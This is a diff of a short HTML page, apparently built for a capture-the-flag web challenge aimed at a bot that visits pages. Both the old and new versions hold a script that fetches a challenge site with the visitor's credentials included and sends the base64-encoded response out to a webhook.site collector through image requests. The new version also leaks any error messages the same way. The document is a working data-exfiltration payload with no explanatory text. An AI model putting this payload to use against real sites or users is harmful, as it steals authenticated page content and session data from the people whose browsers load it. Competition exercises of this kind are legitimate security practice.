@@ -1,10 +1,23 @@
-<script>
-fetch("https://thoughts.challs.m0lecon.it/", { credentials: "include" })
-  .then(r => r.text())
-  .then(t => {
-    const img = new Image();
-    img.src = "https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b?data=" + btoa(t);
-    document.body.appendChild(img);
-  });
-</script>
-<h1>Hello Bot</h1>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Bot Leak Test</title>
+  </head>
+  <body>
+    <h1>Hello Bot 🤖</h1>
+    <script>
+      fetch("https://thoughts.challs.m0lecon.it/", { credentials: "include" })
+        .then((res) => res.text())
+        .then((data) => {
+          const i = new Image();
+          i.src = "https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b?data=" + btoa(data);
+          document.body.appendChild(i);
+        })
+        .catch((e) => {
+          const err = new Image();
+          err.src = "https://webhook.site/dab93e6e-4b06-4c84-b648-9e038c8ee27b?error=" + btoa(e.message);
+          document.body.appendChild(err);
+        });
+    </script>
+  </body>
+</html>
